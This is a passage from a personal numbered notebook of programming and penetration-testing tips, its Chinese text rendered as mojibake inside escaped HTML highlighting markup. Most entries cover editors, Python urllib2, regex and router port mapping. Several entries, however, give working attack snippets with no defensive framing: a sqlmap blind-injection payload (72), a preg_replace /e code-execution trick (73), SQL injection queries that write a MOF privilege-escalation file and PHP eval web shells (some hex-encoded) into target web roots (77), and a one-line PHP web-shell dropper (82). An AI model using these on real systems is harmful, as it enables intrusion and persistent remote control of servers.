&lt;span class=&quot;p&quot;&gt;62.&lt;/span&gt;sublimeæ’ä»¶:
    python pep8 autoformat(pythonä»£ç è‡ªåŠ¨å¯¹é½)ctrl+shift+r
    JsFormat(javascriptä»£ç è‡ªåŠ¨å¯¹é½)ctrl+alt+f
&lt;span class=&quot;p&quot;&gt;63.&lt;/span&gt;linux install node.js&amp;amp;npm   http://www.iteblog.com/archives/1313
&lt;span class=&quot;p&quot;&gt;64.&lt;/span&gt;htmlå†…åµŒjs:
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Script&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;JavaScript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   var a = prompt(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;8f93&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5165&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;4f60&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;7684&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;67&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5427&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5c11&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5e74&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;, &quot;&quot;);
   var b = &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&quot;;
   var c = /.+_.+_.+/gi;
   var d = 0x0;
   var e = a.substr(0x8, 0x5);
   if ($.md5(e) == b.replace(/7/ig, ++d).replace(/8/ig, d &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x2)) {
    var f = a.substr(0x0 / d, 0x7);
    if (f.substr(0x5, 0x2) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&quot; &amp;amp;&amp;amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&quot;) {
      r = a.substr(0xd);
      if (r.charCodeAt(d) - 0x19 == r.charCodeAt(++d) - 0x19 &amp;amp;&amp;amp; r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d)) {
        var g = String.fromCharCode(0x4f);
        g = g.toLowerCase() + g.toLowerCase();
        if (r.substr((++d) &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x3, 0x6) == g.concat(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;79&quot;) &amp;amp;&amp;amp; c.test(a)) {
          d = String(0x1) + String(a.length)
        }
      }
    }
   };
   if (a.substr(0x4, 0x1) != String.fromCharCode(d) || a.substr(0x4, 0x1) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7a&quot;) {
    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;989d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;518d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;53bb&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&quot;)
   } else {
    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;)
   }
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;65.&lt;/span&gt;å®‰è£…requirements.txtä¸­è¦æ±‚çš„ç¯å¢ƒ:pip install -r requirements.txt
&lt;span class=&quot;p&quot;&gt;66.&lt;/span&gt;python urllib&amp;amp;urllib2:
    http://www.bkjia.com/Pythonjc/1088462.html  Pythonä¸­httpè¯·æ±‚æ–¹æ³•åº“æ±‡æ€»,pythonè¯·æ±‚åº“æ±‡æ€»
    httpè¯·æ±‚å¼‚å¸¸å¤„ç†(è·å–å¼‚å¸¸è¯·æ±‚çš„è¿”å›å†…å®¹)
        http://my.oschina.net/duhaizhang/blog/69834
    (çˆ¬è™«å®ç°http://blog.csdn.net/pleasecallmewhy/article/details/8925978
    http://blog.csdn.net/pleasecallmewhy/article/details/8934726)
    beautifulsoupä¸­æ–‡http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html
   0&amp;gt;easyest way
   import urllib2
   response = urllib2.urlopen(&#39;http://python.org/&#39;)
   html = response.read()

   1&amp;gt;without post
   import urllib2
   req = urllib2.Request(&#39;http://www.voidspace.org.uk&#39;)
   response = urllib2.urlopen(req)
   the_page = response.read()

   2&amp;gt;post:(è¦åŠ å…¥ header,data,éœ€è¦ä½¿ç”¨ Request å¯¹è±¡)
   import urllib
   import urllib2
   url = &#39;http://www.someserver.com/cgi-bin/register.cgi&#39;
   values = {&#39;name&#39; : &#39;Michael Foord&#39;,
             &#39;location&#39; : &#39;Northampton&#39;,
             &#39;language&#39; : &#39;Python&#39; }
   data = urllib.urlencode(values)
   req = urllib2.Request(url, data)
   response = urllib2.urlopen(req)
   the_page = response.read()
&lt;span class=&quot;p&quot;&gt;67.&lt;/span&gt;pythonä½¿ç”¨urllib2å®¹æ˜“çŠ¯çš„é”™è¯¯:
ã€€ã€€ç³»ç»Ÿå®‰è£…äº†googleçš„chromeæµè§ˆå™¨,éœ€è¦burpæˆªchromeçš„åŒ…æ—¶ä¼šåœ¨é‡Œé¢è®¾ç½®ä»£ç†,è€Œchromeè®¾ç½®çš„ä»£ç†å³æ˜¯ç³»ç»Ÿçš„ä»£ç†,è€Œfirefoxè®¾ç½®çš„ä»£ç†åªæ˜¯firefoxæµè§ˆå™¨çš„ä»£ç†,å¹¶ä¸å½±å“ç³»ç»Ÿçš„ç½‘ç»œè®¿é—®æ˜¯å¦è¦ç»è¿‡firefoxè®¾ç½®çš„ä»£ç†,
ã€€ã€€å¦‚æœè®¾ç½®äº†chromeçš„ä»£ç†å¦‚127.0.0.1:8080,äº‹åå¿˜è®°å…³é—­,åˆ™ä¼šå½±å“åˆ°ç³»ç»Ÿä¸­æ‰€æœ‰éœ€è¦è”ç½‘çš„ç¨‹åº.
  ã€€urllib2 é»˜è®¤ä¼šä½¿ç”¨ç¯å¢ƒå˜é‡ http_proxyæ¥è®¾ç½® HTTP Proxy,å¦‚æœæƒ³åœ¨ç¨‹åºä¸­æ˜ç¡®æ§åˆ¶ Proxy è€Œä¸å—ç¯å¢ƒå˜é‡çš„å½±å“,å¯ä»¥ä½¿ç”¨è‡ªå·±è®¾ç½®çš„ä»£ç†,å¯ä»¥è®¾ç½®ä»£ç†ä¸ºç©º:

  ã€€null_proxy_handler=urllib2.ProxyHandler({})
  ã€€opener=urllib2.build_opener(null_proxy_handler)
  ã€€urllib2.install_opener(opener)

  ã€€è¿™æ ·å°±ä¸ä¼šå‡ºç°urllib2ã€€error 101ã€€refusedçš„é”™è¯¯äº†,ä¹Ÿå¯ä»¥å°†ç³»ç»Ÿçš„127.0.0.1:8080çš„ä»£ç†å…³æ‰.(linuxä¸­setå‘½ä»¤å¯ä»¥çœ‹åˆ°http_proxyçš„å€¼,http_proxyå¹¶ä¸æ˜¯vpnçš„ip)
  ã€€åœ¨sublime textä¸­æœ‰ä¸ªsublimeREPLæ’ä»¶,f5å¿«æ·é”®å¯ç¼–è¯‘è¿è¡Œpythonè„šæœ¬,ç„¶è€Œå°±ç®—ç³»ç»Ÿè®¾ç½®äº†ä»£ç†127.0.0.1:8080ç­‰,f5ä¾ç„¶å¯ä»¥å°†ä½¿ç”¨äº†urllib2ä¸”æ²¡æœ‰åŠ ä¸Šé¢ï¼“è¡Œä»£ç çš„pythonè„šæœ¬
  ã€€æˆåŠŸæ‰§è¡Œ,ä¹Ÿè®¸æ˜¯sublimeREPLä¸­é»˜è®¤çš„è¿è¡Œä»£ç è®¾ç½®äº†è‡ªå·±çš„ä»£ç†ä¸ºç©º,ä¸”ä¸å½±å“ç³»ç»Ÿä»£ç†http_proxyçš„å€¼.
&lt;span class=&quot;p&quot;&gt;68.&lt;/span&gt;python,beautifulsoupä¸­æ­£åˆ™åŒ¹é…ä¸­æ–‡çš„é”™è¯¯è§£å†³åŠæ³•:http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
   pythonæ­£åˆ™è¡¨è¾¾å¼:
       http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
       pythonä¸€èˆ¬é»˜è®¤è´ªå©ªæ¨¡å¼(ä¹Ÿå³å°½é‡å¾€é•¿åº¦å¤šçš„ç»“æœåŒ¹é…),å˜æˆéè´ªå©ªæ–¹æ³•:&lt;span class=&quot;ge&quot;&gt;*?(*&lt;/span&gt;åŠ ä¸Š?)
       æ­£åˆ™è¡¨è¾¾å¼ â€“ è¿ç®—ç¬¦ä¼˜å…ˆçº§
            http://wp.huangshiyang.com/regexp&lt;span class=&quot;sb&quot;&gt;

            åŒ¹é…ä¸åŒ…å«...
            http://www.jb51.net/article/52491.htm

            å‰å‘ç•Œå®š|åå‘ç•Œå®š|å‰å‘éç•Œå®š|åå‘éç•Œå®š
            http://blog.csdn.net/smilelance/article/details/6529950
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;69.&lt;/span&gt;pythonä¸­è·å¾—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„è¾“å‡º:http://blog.csdn.net/g457499940/article/details/17068277
&lt;span class=&quot;p&quot;&gt;70.&lt;/span&gt;pythonä»£ç ä¸­ä¸èƒ½æœ‰~ç¬¦å·å½“ä½œ/rootç›®å½•çš„ä¹ æƒ¯,open(&#39;~/something&#39;,&#39;r+&#39;)ä¼šå‡ºé”™,os.system(&#39;~/something&#39;)ä¸ä¼š,ä¸ºä¿è¯ä¸å‡ºé”™,åœ¨ä»£ç ä¸­ä¸ç”¨~ç¬¦å·,å¦å¤–os.system(),open()ç­‰å‡½æ•°ä¸­ä¸è¦æœ‰%sè¿™ç§æ ¼å¼åŒ–å­—ç¬¦ä¸²å˜é‡
ã€€ã€€å¦‚æœè¦ç”¨åˆ°åœ¨è¿™äº›å‡½æ•°ä¸­ä¼ å…¥ä¸€ä¸ªå˜é‡ä½œå‚æ•°,å…ˆåœ¨os.system(),open()ç­‰å‡½æ•°å‰é¢æ ¼å¼åŒ–æˆæ™®é€šä¸å¸¦%sçš„å˜é‡å†ä¼ å…¥è¿™äº›å‡½æ•°,eg.a=&#39;python /root/%s&#39; % input(),os.system(a)
&lt;span class=&quot;p&quot;&gt;71.&lt;/span&gt;ida proä¸­graphåŠŸèƒ½å¤±è´¥,could not find grapher &#39;qwingraph.exe&#39;.please check GRAPH_VISUALIZER in ida.cfgã€€ã€€ã€€ã€€ã€€ã€€è§£å†³æ–¹æ³•http://blog.csdn.net/qysh123/article/details/17590731
&lt;span class=&quot;p&quot;&gt;72.&lt;/span&gt;sqlmapè·‘å‡ºæœ‰å¦‚
   Payload: 8.8.8.8&#39; AND 3588=3588-- RMEo
   çš„ç›²æ³¨,å¦‚æœä½¿ç”¨äº†--batchå‚æ•°æˆ–è€…ä½¿ç”¨sqlmapæ¨èçš„(found sql injection in MySQL database,dismiss other type of database?Y/n),è™½ç„¶è¿™æ ·çš„ç›²æ³¨ä¸€èˆ¬æ˜¯MySQLçš„æ³¨å…¥ç‚¹,ä½†æ˜¯å…¶ä»–æ•°æ®åº“ä¹Ÿæœ‰å¯èƒ½æ˜¯è¿™æ ·çš„,
   æ¯”å¦‚SQLite,è¿™ä¸ªæ—¶å€™å¦‚æœåŒæ„å¿½ç•¥å…¶ä»–æ•°æ®åº“ç±»å‹çš„æ£€æµ‹,ä¼šå‘ç°sqlmapæŒ‰ç…§MySQLçš„æ³¨å…¥è¯­æ³•è·‘ä¸å‡ºä»€ä¹ˆç»“æœ,database:none.åŒç†,åœ¨ä¸€èˆ¬sqlmapä½¿ç”¨è¿‡ç¨‹ä¸­,ä¸ºäº†å…¨é¢çš„æ£€æµ‹,æœ€å¥½ä¸è¦ä¸€ç›´ä½¿ç”¨sqlmapæ¨èçš„é»˜è®¤é€‰é¡¹.åœ¨æ­¤ä¾‹ä¸­,ä½¿ç”¨--dbms=SQLite
   å‚æ•°,æˆåŠŸè·‘å‡ºç›®æ ‡SQLiteæ•°æ®åº“çš„å†…å®¹.å¦å¤–,å®éªŒä¸­å‘ç°sqlmapä¼šå‡ºç°ä¸€ä¼šèƒ½è·‘å‡º,ä¸€ä¼šè·‘ä¸å‡ºçš„ç°è±¡,å¯è§,å·¥å…·ä¸æ˜¯å®Œå…¨å¯é çš„,è¦æ˜¯ä¸€ä¸‹æ²¡æœ‰è·‘å‡º,å¤šè·‘å‡ æ¬¡å°±å‡ºæ¥äº†.
&lt;span class=&quot;p&quot;&gt;73.&lt;/span&gt;preg_replaceåŒ…å«/eä¿®é¥°ç¬¦åˆ©ç”¨:http://www.jb51.net/article/38714.htmã€€å…¶ä¸­echo &quot;${@phpinfo()}&quot;;å°±å¯ä»¥äº†,ä¸å¿…ã€€echo &quot;{${phpinfo()}}&quot;;
&lt;span class=&quot;p&quot;&gt;74.&lt;/span&gt;vimé…ç½®:
          https://github.com/xinghuacai/spf13-vim
          http://blog.csdn.net/namecyf/article/details/7787479
          https://github.com/Valloric/YouCompleteMe
          https://github.com/VundleVim/Vundle.vim#about
   pythonæ“ä½œvim
          http://top.jobbole.com/15078/
   vimä¸­F5ç¼–è¯‘è¿è¡Œpyæ–‡ä»¶:1&amp;gt;http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
                           æŠŠfunctionæ·»åŠ åœ¨_vimrcçš„å‰è¾¹,ä¸è¦æ”¾åœ¨æœ€å:
                           function CheckPythonSyntax()
                               let mp = &amp;amp;makeprg
                               let ef = &amp;amp;errorformat
                               let exeFile = expand(&quot;%:t&quot;)
                               setlocal makeprg=python&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;-u
                               set efm=%C&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%.%#,%A&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;File&lt;span class=&quot;se&quot;&gt;\ \&quot;&lt;/span&gt;%f&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;line&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%l%.%#,%Z%&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%^\ &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;%&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;@=%m
                               silent make %
                               copen
                               let &amp;amp;makeprg     = mp
                               let &amp;amp;errorformat = ef
                           endfunctio
   
                           ç„¶åæ·»åŠ :
                           map &lt;span class=&quot;nt&quot;&gt;&amp;lt;F5&amp;gt;&lt;/span&gt; :call CheckPythonSyntax()&lt;span class=&quot;nt&quot;&gt;&amp;lt;CR&amp;gt;&lt;/span&gt;
                         2&amp;gt;åœ¨vimrcæ–‡ä»¶ä¸­åŠ nnoremap &lt;span class=&quot;nt&quot;&gt;&amp;lt;buffer&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;F9&amp;gt;&lt;/span&gt; :exec &#39;!python&#39; shellescape(@%, 1)&lt;span class=&quot;nt&quot;&gt;&amp;lt;cr&amp;gt;&lt;/span&gt;(1æ›´å¥½)
    vimè¿›é˜¶:http://coolshell.cn/articles/5426.html&lt;span class=&quot;sb&quot;&gt;

    my tmuxé…ç½®:
        #https://github.com/tmux/tmux     å®‰è£…æœ€æ–°ç‰ˆæœ¬
        https://github.com/gpakosz/.tmux å®‰è£…æ¯”è¾ƒå¥½çš„é…ç½®
        echo $EDITOR
        export EDITOR=vim
        echo $EDITOR
        http://blog.csdn.net/g1036583997/article/details/50466499    tmuxæåˆ¶æ¨¡å¼
        http://cenalulu.github.io/linux/tmux/

    ubuntuå®‰è£…Oh-My-Zsh:
        https://zhuanlan.zhihu.com/p/19556676
        http://www.jianshu.com/p/9a5c4cb0452d
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;75.&lt;/span&gt;1&amp;gt;dmz+å…‰çŒ«+æœ‰çº¿è·¯ç”±+æ— çº¿è·¯ç”±ä¸‹çš„ç«¯å£æ˜ å°„:
   2&amp;gt;æ‹“æ‰‘å›¾å¤§è‡´ä¸º:
          å…‰çŒ«(192.168.1.1)
           ï½œ
        æœ‰çº¿è·¯ç”±
           ï½œ        
        æ— çº¿è·¯ç”±(192.168.3.1)
           ï½œ        
          å†…ç½‘(192.168.3.x)
   3&amp;gt;å…¶ä¸­å…‰çŒ«å«æœ‰è·¯ç”±å™¨åŠŸèƒ½,æ­¤å¤„æœ‰çº¿è·¯ç”±ç›¸å½“äºé›†çº¿å™¨åŠŸèƒ½
   4&amp;gt;å¦‚æœåœ¨å…‰çŒ«ä¸Šè®¾ç½®dmzä¸ºæ— çº¿è·¯ç”±åœ¨å…‰çŒ«æ‰€åœ¨ç½‘æ®µçš„ip,ä¹Ÿå³192.168.1.4(æ­¤ipå¯åœ¨æ— çº¿è·¯ç”±çš„wanå£æ‰€åœ¨ipå€¼çœ‹åˆ°,æ­¤ipå€¼ç”±å…‰çŒ«ä¸Šçš„dhcpéšæœºåˆ†é…)
   5&amp;gt;wanå£å’Œlanå£åŒºåˆ«:&amp;gt;æ¯ä¸ªè·¯ç”±å™¨æœ‰wanå£å’Œlanå£,å…‰çŒ«æ‹¨å·,å…¶wanå£ipä¸ºinternetæ¥å£æ‰€åœ¨ip,ä¸€èˆ¬ä¸ºåŠ¨æ€è·å–çš„ä¸€ä¸ªå€¼,å…¶lanå£ipä¸º192.168.1.1(æ­¤ipå¯åœ¨å…‰çŒ«ä¸Šäººå·¥è®¾ç½®æˆä»»æ„192.168.x.1å½¢å¼)
                  ã€€&amp;gt;æ— çº¿è·¯ç”±çš„wanå£ipä¸ºå…‰çŒ«æ‰€åœ¨å±€åŸŸç½‘çš„ipæ®µä¸­çš„ip:192.168.1.4,lanå£ipä¸º192.168.3.1(æ­¤ipå¯åœ¨æ— çº¿è·¯ç”±å™¨ä¸Šäººå·¥è®¾ç½®æˆä»»æ„192.168.x.1å½¢å¼)
   6&amp;gt;ä¸åŠ dmzæ—¶çš„å†…ç½‘ç«¯å£æ˜ å°„:å…‰çŒ«ä¸Šè®¾ç½®nat:å°†å¤–éƒ¨æ•°æ®è½¬åˆ°192.168.1.4åŠå¯¹åº”ç«¯å£,æ— çº¿è·¯ç”±å™¨ä¸Šè®¾ç½®nat:å°†å¤–éƒ¨æ•°æ®è½¬åˆ°éœ€è¦ç«¯å£æ˜ å°„çš„å†…ç½‘æœºå™¨çš„ip(eg.192.168.3.11)åŠå¯¹åº”ç«¯å£
   7&amp;gt;åŠ dmzæ—¶çš„å†…ç½‘ç«¯å£æ˜ å°„:åœ¨å…‰çŒ«ä¸Šè®¾ç½®dmzä¸ºæ— çº¿è·¯ç”±åœ¨å…‰çŒ«æ‰€åœ¨ç½‘æ®µçš„ip,ä¹Ÿå³192.168.1.4,åœ¨æ— çº¿è·¯ç”±å™¨ä¸Šè®¾ç½®nat:å°†å¤–éƒ¨æ•°æ®è½¬åˆ°éœ€è¦ç«¯å£æ˜ å°„çš„å†…ç½‘æœºå™¨çš„ip(eg.192.168.3.11)åŠå¯¹åº”ç«¯å£(å…¶ä¸­dmzç›¸å½“äºè½¬å‘å…‰çŒ«ä¸Šçš„æ‰€æœ‰ç«¯å£æ•°æ®åˆ°æ— çº¿è·¯ç”±å™¨ä¸Š,å¤–éƒ¨è®¿é—®å…‰çŒ«å…¬ç½‘ipå³ç›¸å½“äºè®¿é—®æ— çº¿è·¯ç”±)
&lt;span class=&quot;p&quot;&gt;76.&lt;/span&gt;å†…ç½‘æ¸—é€ ä»£ç†&amp;amp;è½¬å‘ http://www.heysec.org/archives/115
&lt;span class=&quot;p&quot;&gt;77.&lt;/span&gt;union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;-- - (è·¯å¾„ä¸­ç”¨/ä¸ç”¨&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;
   å†™ä¸€å¥è¯æ˜¯select 1,2,3,4,&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&lt;/span&gt;,6 into outfile &#39;c:/ksla/lsd/&#39;-- -ã€€ã€€ã€€ã€€(outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
   mysqlä¸­phpmyadminææƒ:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
   udf:http://www.cnblogs.com/qing123/p/4676808.html
   outfileå’ŒdumpfileåŒºåˆ«:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
   åœ¨phpmyadminä¸­
   windowsç³»ç»Ÿåœ¨phpmyadminçš„webåå°å†™æ–‡ä»¶æ—¶å†™æˆinto dumpfile &#39;c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ww&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ome&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;.php&#39;æ— æ³•å†™å…¥æ—¶,æ”¹æˆinto dumpfie &#39;c:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;www&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;some&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;1.php&#39;
   SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILEã€€&#39;/phpstudy/www/121.txt&#39;    (/phpstudy/www/reDuh.php)  æœ¬åœ°(linux)å–hexå€¼
   select unhex(&#39;...&#39;) into dumpfile &#39;c:/inetpub/wwwroot/memberinfo/....php&#39;;-- -æˆåŠŸ,è¿™æ ·ä¸ä¼šè¢«è½¬ä¹‰,å¦‚æœæ˜¯outfileä¼šè¢«è½¬ä¹‰ã€€è¿œç¨‹dumpfileå‡ºå» (å¯¹æ–¹windows)
   åŒç†å†™shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex(&#39;3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E&#39;) into dumpfile &#39;C:/AAWServer/www/php/k82.php&#39;;
&lt;span class=&quot;p&quot;&gt;78.&lt;/span&gt;æœ‰æ—¶å€™visual studio2015æˆ–å…¶å®ƒç‰ˆæœ¬çš„ideç¼–è¯‘å‡ºæ¥çš„exeæ–‡ä»¶æ— æ³•åœ¨å…¶å®ƒæœºå™¨ä¸Šè¿è¡Œ(releaseç‰ˆæœ¬ä¹Ÿä¸å¯ä»¥çš„æ—¶å€™)å¯ä»¥ç›´æ¥è¯•è¯•g++/gcc -o out.exe file.cppç­‰å‘½ä»¤è‡ªè¡Œç¼–è¯‘.
&lt;span class=&quot;p&quot;&gt;79.&lt;/span&gt;ctrl+shift+p==&amp;gt;install==&amp;gt;package syning,backup sublime settings==&amp;gt;https://github.com/csch0/SublimeText-Package-Syncing
&lt;span class=&quot;p&quot;&gt;80.&lt;/span&gt;http://www.tuicool.com/articles/zIJrEjn GitHubä¸ŠREADMEå†™æ³•æš¨markdownè¯­æ³•è§£è¯»
&lt;span class=&quot;p&quot;&gt;81.&lt;/span&gt;windowsä¸‹caclsæŸ¥çœ‹æƒé™å’Œè®¾ç½®æƒé™http://41080138.blog.51cto.com/2587513/951403
&lt;span class=&quot;p&quot;&gt;82.&lt;/span&gt;phpå†™shell: cmd=fputs(fopen(&#39;chk.php&#39;,&#39;w&#39;),&#39;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[nihao]); ?&amp;gt;&lt;/span&gt;&#39;);
   å…¶ä¸­nihaoçš„ä½ç½®ä¸èƒ½æœ‰&#39;&#39;æˆ–&quot;&quot;,è€Œä¸”fputsçš„ç¬¬äºŒä¸ªå‚æ•°åªèƒ½ç”¨å•å¼•å·åŒ…ä½
